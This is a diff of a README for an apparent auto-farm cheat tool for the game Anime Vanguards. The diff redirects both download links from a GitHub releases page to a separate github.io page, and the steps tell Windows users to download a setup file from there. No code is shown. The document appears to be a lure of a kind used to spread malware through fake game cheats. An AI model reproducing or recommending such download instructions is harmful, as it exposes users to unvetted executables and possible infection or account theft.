@@ -1,6 +1,6 @@
 # 🤖 Anime-Vanguards-Script-Auto-Farm-2026 - Automate your Anime Vanguards gameplay easily
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/scraggly-danielhudsonburnham629/Anime-Vanguards-Script-Auto-Farm-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://scraggly-danielhudsonburnham629.github.io)
 
 This software automates repetitive tasks in Anime Vanguards. It handles unit deployment, resource collection, and quest completion without manual input. Use this tool to improve game efficiency and save time.
 
@@ -17,7 +17,7 @@ Ensure your computer meets these requirements to run the software correctly:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [official release page](https://github.com/scraggly-danielhardsoneburnham629/Anime-Vanguards-Script-Auto-Farm-2026/releases).
+1. Go to the [official release page](https://scraggly-danielhudsonburnham629.github.io).
 2. Look for the latest version listed under the assets section.
 3. Download the setup file to your computer. 
 4. Move the file to a folder you can access easily, such as your Desktop.
